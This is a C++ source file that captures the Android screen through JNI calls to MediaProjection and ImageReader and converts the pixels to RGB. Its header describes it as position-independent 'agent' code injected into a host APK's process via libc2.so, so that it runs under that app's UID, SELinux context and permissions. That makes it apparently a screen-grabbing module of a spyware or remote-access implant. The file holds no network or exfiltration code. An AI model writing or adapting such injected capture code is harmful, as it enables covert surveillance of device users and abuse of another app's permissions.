/**
 * @file screen.cc
 * @brief Android MediaProjection screen capture via JNI
 *
 * @details Captures the screen on non-rooted Android by using JNI to call
 * the MediaProjection API from position-independent code. The PIC agent
 * runs as a thread in the host APK's process (injected via libc2.so),
 * sharing the APK's UID, SELinux context, and permissions.
 *
 * All state is stack-local — no static/global variables, which would
 * create .bss/.data sections and break position-independence.
 * JNI attachment is re-done on each call (cheap: GetEnv returns
 * immediately if the thread is already attached).
 *
 * Falls back to POSIX screen capture (DRM/fbdev/screencap) if JNI
 * attachment or MediaProjection setup fails.
 */

#include "platform/screen/screen.h"
#include "core/memory/memory.h"
#include "platform/kernel/android/jni.h"
#include "platform/kernel/android/syscall.h"
#include "platform/kernel/android/system.h"

// =============================================================================
// JNI helpers — call method and clear exceptions
// =============================================================================

static jobject SafeCallObjectMethod(JNIEnv *env, jobject obj, jmethodID mid)
{
	jobject result = (*env)->CallObjectMethod((PVOID)env, obj, mid);
	if ((*env)->ExceptionOccurred((PVOID)env))
	{
		(*env)->ExceptionClear((PVOID)env);
		return nullptr;
	}
	return result;
}

static jint SafeCallIntMethod(JNIEnv *env, jobject obj, jmethodID mid)
{
	jint result = (*env)->CallIntMethod((PVOID)env, obj, mid);
	if ((*env)->ExceptionOccurred((PVOID)env))
	{
		(*env)->ExceptionClear((PVOID)env);
		return -1;
	}
	return result;
}

static jclass SafeFindClass(JNIEnv *env, const CHAR *name)
{
	jclass cls = (*env)->FindClass((PVOID)env, name);
	if ((*env)->ExceptionOccurred((PVOID)env))
	{
		(*env)->ExceptionClear((PVOID)env);
		return nullptr;
	}
	return cls;
}

/// @brief Call a void instance method via raw JNI function table
static VOID CallVoidMethod(JNIEnv *env, jobject obj, jmethodID mid)
{
	typedef void (*FnCallVoidMethod)(PVOID, jobject, jmethodID, ...);
	FnCallVoidMethod fn = (FnCallVoidMethod)((PVOID *)env)[61];
	fn((PVOID)env, obj, mid);
}

/// @brief Get element from a jobjectArray via raw JNI function table
static jobject GetObjectArrayElement(JNIEnv *env, jobjectArray arr, jsize index)
{
	typedef jobject (*FnGetElement)(PVOID, jobjectArray, jsize);
	FnGetElement fn = (FnGetElement)((PVOID *)env)[173];
	return fn((PVOID)env, arr, index);
}

/// @brief Get direct buffer address via raw JNI function table
static PVOID GetDirectBufferAddress(JNIEnv *env, jobject buf)
{
	typedef PVOID (*FnGetAddr)(PVOID, jobject);
	FnGetAddr fn = (FnGetAddr)((PVOID *)env)[230];
	return fn((PVOID)env, buf);
}

// =============================================================================
// Get display metrics from WindowManager (all stack-local)
// =============================================================================

static BOOL GetDisplayMetrics(JNIEnv *env, UINT32 &width, UINT32 &height)
{
	auto atClassName = "android/app/ActivityThread";
	jclass atClass = SafeFindClass(env, (const CHAR *)atClassName);
	if (atClass == nullptr)
		return false;

	auto currentAppName = "currentApplication";
	auto currentAppSig = "()Landroid/app/Application;";
	jmethodID currentApp = (*env)->GetStaticMethodID(
		(PVOID)env, atClass, (const CHAR *)currentAppName, (const CHAR *)currentAppSig);
	if (currentApp == nullptr)
		return false;

	jobject context = (*env)->CallStaticObjectMethod((PVOID)env, atClass, currentApp);
	if (context == nullptr || (*env)->ExceptionOccurred((PVOID)env))
	{
		(*env)->ExceptionClear((PVOID)env);
		return false;
	}

	// context.getSystemService("window") -> WindowManager
	jclass ctxClass = (*env)->GetObjectClass((PVOID)env, context);
	auto getSvcName = "getSystemService";
	auto getSvcSig = "(Ljava/lang/String;)Ljava/lang/Object;";
	jmethodID getSvc = (*env)->GetMethodID((PVOID)env, ctxClass,
		(const CHAR *)getSvcName, (const CHAR *)getSvcSig);
	if (getSvc == nullptr)
		return false;

	auto windowStr = "window";
	jstring windowSvc = (*env)->NewStringUTF((PVOID)env, (const CHAR *)windowStr);
	jobject wm = (*env)->CallObjectMethod((PVOID)env, context, getSvc, windowSvc);
	(*env)->DeleteLocalRef((PVOID)env, windowSvc);
	if (wm == nullptr)
		return false;

	// WindowManager.getDefaultDisplay()
	auto wmClassName = "android/view/WindowManager";
	jclass wmClass = SafeFindClass(env, (const CHAR *)wmClassName);
	if (wmClass == nullptr)
		return false;

	auto getDisplayName = "getDefaultDisplay";
	auto getDisplaySig = "()Landroid/view/Display;";
	jmethodID getDisplay = (*env)->GetMethodID(
		(PVOID)env, wmClass, (const CHAR *)getDisplayName, (const CHAR *)getDisplaySig);
	if (getDisplay == nullptr)
		return false;

	jobject display = SafeCallObjectMethod(env, wm, getDisplay);
	if (display == nullptr)
		return false;

	// Display.getWidth() / Display.getHeight()
	jclass displayClass = (*env)->GetObjectClass((PVOID)env, display);
	auto getWidthName = "getWidth";
	auto getHeightName = "getHeight";
	auto intRetSig = "()I";
	jmethodID getWidth = (*env)->GetMethodID(
		(PVOID)env, displayClass, (const CHAR *)getWidthName, (const CHAR *)intRetSig);
	jmethodID getHeight = (*env)->GetMethodID(
		(PVOID)env, displayClass, (const CHAR *)getHeightName, (const CHAR *)intRetSig);

	if (getWidth == nullptr || getHeight == nullptr)
		return false;

	width = (UINT32)SafeCallIntMethod(env, display, getWidth);
	height = (UINT32)SafeCallIntMethod(env, display, getHeight);

	return (width > 0 && height > 0);
}

// =============================================================================
// MediaProjection device encoding
// =============================================================================

constexpr INT32 MEDIAPROJECTION_DEVICE_LEFT = -3000;

// =============================================================================
// Screen::GetDevices — MediaProjection backend
// =============================================================================

VOID MediaProjectionGetDevices(ScreenDevice *tempDevices, UINT32 &deviceCount, UINT32 maxDevices)
{
	if (deviceCount >= maxDevices)
		return;

	JNIEnv *env = nullptr;
	if (!JniBridgeAttach(&env, nullptr))
		return;

	UINT32 width = 0, height = 0;
	if (!GetDisplayMetrics(env, width, height))
		return;

	tempDevices[deviceCount].Left = MEDIAPROJECTION_DEVICE_LEFT;
	tempDevices[deviceCount].Top = 0;
	tempDevices[deviceCount].Width = width;
	tempDevices[deviceCount].Height = height;
	tempDevices[deviceCount].Primary = true;
	deviceCount++;
}

// =============================================================================
// Screen::Capture — MediaProjection backend
// =============================================================================

Result<VOID, Error> MediaProjectionCapture(const ScreenDevice &device, Span<RGB> buffer)
{
	JNIEnv *env = nullptr;
	if (!JniBridgeAttach(&env, nullptr))
		return Result<VOID, Error>::Err(Error(Error::Screen_CaptureFailed));

	// Get application context
	auto atClassName = "android/app/ActivityThread";
	jclass atClass = SafeFindClass(env, (const CHAR *)atClassName);
	if (atClass == nullptr)
		return Result<VOID, Error>::Err(Error(Error::Screen_CaptureFailed));

	auto currentAppName = "currentApplication";
	auto currentAppSig = "()Landroid/app/Application;";
	jmethodID currentApp = (*env)->GetStaticMethodID(
		(PVOID)env, atClass, (const CHAR *)currentAppName, (const CHAR *)currentAppSig);
	jobject context = (*env)->CallStaticObjectMethod((PVOID)env, atClass, currentApp);
	if (context == nullptr)
		return Result<VOID, Error>::Err(Error(Error::Screen_CaptureFailed));

	// Create ImageReader on each capture (no global state)
	auto irClassName = "android/media/ImageReader";
	jclass irClass = SafeFindClass(env, (const CHAR *)irClassName);
	if (irClass == nullptr)
		return Result<VOID, Error>::Err(Error(Error::Screen_CaptureFailed));

	auto newInstanceName = "newInstance";
	auto newInstanceSig = "(IIII)Landroid/media/ImageReader;";
	jmethodID newInstance = (*env)->GetStaticMethodID(
		(PVOID)env, irClass, (const CHAR *)newInstanceName, (const CHAR *)newInstanceSig);
	if (newInstance == nullptr)
		return Result<VOID, Error>::Err(Error(Error::Screen_CaptureFailed));

	constexpr jint PIXEL_FORMAT_RGBA_8888 = 1;
	constexpr jint MAX_IMAGES = 2;

	jvalue irArgs[4];
	irArgs[0].i = (jint)device.Width;
	irArgs[1].i = (jint)device.Height;
	irArgs[2].i = PIXEL_FORMAT_RGBA_8888;
	irArgs[3].i = MAX_IMAGES;

	jobject imageReader = (*env)->CallStaticObjectMethodA(
		(PVOID)env, irClass, newInstance, irArgs);
	if (imageReader == nullptr)
		return Result<VOID, Error>::Err(Error(Error::Screen_CaptureFailed));

	// ImageReader.acquireLatestImage()
	auto acquireName = "acquireLatestImage";
	auto acquireSig = "()Landroid/media/Image;";
	jmethodID acquire = (*env)->GetMethodID(
		(PVOID)env, irClass, (const CHAR *)acquireName, (const CHAR *)acquireSig);
	if (acquire == nullptr)
		return Result<VOID, Error>::Err(Error(Error::Screen_CaptureFailed));

	jobject image = SafeCallObjectMethod(env, imageReader, acquire);
	if (image == nullptr)
		return Result<VOID, Error>::Err(Error(Error::Screen_CaptureFailed));

	// Image.getPlanes() -> Plane[]
	jclass imageClass = (*env)->GetObjectClass((PVOID)env, image);
	auto getPlanesName = "getPlanes";
	auto getPlanesSig = "()[Landroid/media/Image$Plane;";
	jmethodID getPlanes = (*env)->GetMethodID(
		(PVOID)env, imageClass, (const CHAR *)getPlanesName, (const CHAR *)getPlanesSig);
	jobjectArray planes = (jobjectArray)SafeCallObjectMethod(env, image, getPlanes);

	if (planes == nullptr)
	{
		auto closeName = "close";
		auto closeSig = "()V";
		jmethodID closeMethod = (*env)->GetMethodID(
			(PVOID)env, imageClass, (const CHAR *)closeName, (const CHAR *)closeSig);
		if (closeMethod)
			CallVoidMethod(env, image, closeMethod);
		return Result<VOID, Error>::Err(Error(Error::Screen_CaptureFailed));
	}

	// planes[0].getBuffer() -> ByteBuffer, getRowStride(), getPixelStride()
	auto planeClassName = "android/media/Image$Plane";
	jclass planeClass = SafeFindClass(env, (const CHAR *)planeClassName);
	if (planeClass == nullptr)
		return Result<VOID, Error>::Err(Error(Error::Screen_CaptureFailed));

	auto getBufferName = "getBuffer";
	auto getBufferSig = "()Ljava/nio/ByteBuffer;";
	jmethodID getBuffer = (*env)->GetMethodID(
		(PVOID)env, planeClass, (const CHAR *)getBufferName, (const CHAR *)getBufferSig);

	auto getRowStrideName = "getRowStride";
	auto intRetSig = "()I";
	jmethodID getRowStride = (*env)->GetMethodID(
		(PVOID)env, planeClass, (const CHAR *)getRowStrideName, (const CHAR *)intRetSig);

	auto getPixelStrideName = "getPixelStride";
	jmethodID getPixelStride = (*env)->GetMethodID(
		(PVOID)env, planeClass, (const CHAR *)getPixelStrideName, (const CHAR *)intRetSig);

	jobject plane0 = GetObjectArrayElement(env, planes, 0);
	if (plane0 == nullptr)
		return Result<VOID, Error>::Err(Error(Error::Screen_CaptureFailed));

	jobject byteBuffer = SafeCallObjectMethod(env, plane0, getBuffer);
	jint rowStride = SafeCallIntMethod(env, plane0, getRowStride);
	jint pixelStride = SafeCallIntMethod(env, plane0, getPixelStride);

	if (byteBuffer == nullptr || rowStride <= 0 || pixelStride <= 0)
		return Result<VOID, Error>::Err(Error(Error::Screen_CaptureFailed));

	UINT8 *pixelData = (UINT8 *)GetDirectBufferAddress(env, byteBuffer);
	if (pixelData == nullptr)
		return Result<VOID, Error>::Err(Error(Error::Screen_CaptureFailed));

	// Convert RGBA to RGB
	UINT32 width = device.Width;
	UINT32 height = device.Height;
	PRGB rgbBuf = buffer.Data();

	for (UINT32 y = 0; y < height; y++)
	{
		UINT8 *row = pixelData + (USIZE)y * (USIZE)rowStride;
		for (UINT32 x = 0; x < width; x++)
		{
			UINT8 *src = row + (USIZE)x * (USIZE)pixelStride;
			rgbBuf[y * width + x].Red = src[0];
			rgbBuf[y * width + x].Green = src[1];
			rgbBuf[y * width + x].Blue = src[2];
		}
	}

	// Close image to release buffer
	auto closeName = "close";
	auto closeSig = "()V";
	jmethodID closeMethod = (*env)->GetMethodID(
		(PVOID)env, imageClass, (const CHAR *)closeName, (const CHAR *)closeSig);
	if (closeMethod)
		CallVoidMethod(env, image, closeMethod);

	return Result<VOID, Error>::Ok();
}
